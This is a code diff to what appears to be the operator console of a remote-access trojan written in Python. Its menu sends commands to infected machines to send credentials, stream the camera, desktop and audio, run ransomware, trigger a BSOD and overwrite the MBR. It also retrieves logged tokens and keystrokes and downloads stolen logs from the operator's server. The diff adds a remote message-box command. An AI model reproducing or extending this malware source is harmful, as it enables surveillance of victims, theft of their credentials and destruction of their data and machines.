@@ -101,6 +101,9 @@ class Main:
                 try:
                     choice = int(input(f"{self.indent}>>"))
                     return self.computers[choice - 1]
+                except KeyboardInterrupt:
+                    break
+
                 except:
                   uiprint("Invalid option!", "error")
 
@@ -224,13 +227,8 @@ class Main:
                     img = ImageTk.PhotoImage(pilimage)
                     panel.configure(image=img)
                     panel.image = img
-                except (KeyboardInterrupt, AttributeError):
+                except (KeyboardInterrupt, AttributeError, Exception):
                     break
-
-                except Exception as e:
-                    ws.close()
-                    self.display()
-                    ws = self.establishConnection()
 
         def display(self):
             window = tk.Tk()
@@ -263,18 +261,20 @@ class Main:
             "Stream Desktop","Stream Audio", "Stop Streaming Camera",
             "Stop Streaming Desktop", "Stop Streaming Audio", "Restart Pc", 
             "Start Ransomware", "Start Trollware", "Stop Trollware", 
-            "Start BSOD", "Overwrite MBR", "Shutdown Pc", 
-            "Logged Tokens", "Logged Keystrokes", "Uninstall Client", "Show Targets"
+            "Start BSOD", "Overwrite MBR", "Show Message Box",
+            "Shutdown Pc", "Logged Tokens", "Logged Keystrokes", 
+            "Uninstall Client", "Show Targets"
         ]
 
         commands = [
             None, None, "sendCreds", 
-            "nukeTokens", "updateWebhook:", "streamCamera", 
+            "nukeTokens", None, "streamCamera", 
             "streamDesktop", "streamAudio", "stopDesktop", 
             "stopCamera", "stopAudio", "restart", 
             "startRansomware", "Troll", "stopTroll",
-            "bsod", "mbr", "shutdown", 
-            None, None, "clean", None
+            "bsod", "mbr", None, 
+            "shutdown", None, None, 
+            "clean", None
         ]
 
         while True:
@@ -333,7 +333,7 @@ Ice Bear#0167   |   Ice Bear#0167  |   Ice Bear#0167  |   Ice Bear#0167  |   Ice
                 self.clear()
                 continue
 
-            if choice == 19:
+            if choice == 20:
                 tokens = self.get_tokens()
                 if not tokens:
                     self.uiprint('No available tokens.', 'error')
@@ -351,7 +351,7 @@ Ice Bear#0167   |   Ice Bear#0167  |   Ice Bear#0167  |   Ice Bear#0167  |   Ice
                 self.clear()
                 continue
 
-            elif choice == 20:
+            elif choice == 21:
                 uiprint('Downloading logs...')
                 download = requests.get(f'https://{self.host}/logs', data={'key': self.key}).content
                 with open('logs.zip', 'wb') as file:
@@ -362,7 +362,7 @@ Ice Bear#0167   |   Ice Bear#0167  |   Ice Bear#0167  |   Ice Bear#0167  |   Ice
                 self.clear()
                 continue
 
-            elif choice == 22:
+            elif choice == 23:
                 self.get_input(choose=False)
                 time.sleep(1)
                 self.clear()
@@ -425,14 +425,47 @@ Ice Bear#0167   |   Ice Bear#0167  |   Ice Bear#0167  |   Ice Bear#0167  |   Ice
                 command = f"updateWebhook:{webhook}"
                 self.send_command(command, target)
 
-            elif choice == 6:                
+            elif choice == 6:
                 self.Video(target, 0, self.host, self.key)
                 
-            elif choice == 7:                
+            elif choice == 7:
                 self.Video(target, 1, self.host, self.key)
                 
-            elif choice == 8:                
+            elif choice == 8:
                 self.Audio(target, self.host, self.key)
+
+            elif choice == 18:
+                messageboxes = [
+                    "Error",
+                    "Question",
+                    "Warning"
+                ]
+
+                uiprint('Select messagebox type:\n')
+                for count, messagebox in enumerate(messageboxes):
+                    uiprint(f'{count + 1}. {messagebox}')
+
+                while True:
+                    try:
+                        choice = int(input(f"{self.indent}>>")) - 1
+
+                        messageboxes[choice]
+                        break
+
+                    except KeyboardInterrupt:
+                        break
+
+                    except:
+                        uiprint('Invalid option', 'error')
+
+                uiprint('Enter messagebox title:')
+                title = input(f"{self.indent}>>")
+
+                uiprint('Enter messagebox message:')
+                message = input(f"{self.indent}>>")
+
+                self.send_command(f"messageBox:{choice}:{title}:{message}", target)
+                    
             else:
                 uiprint('Command Sent!')
 
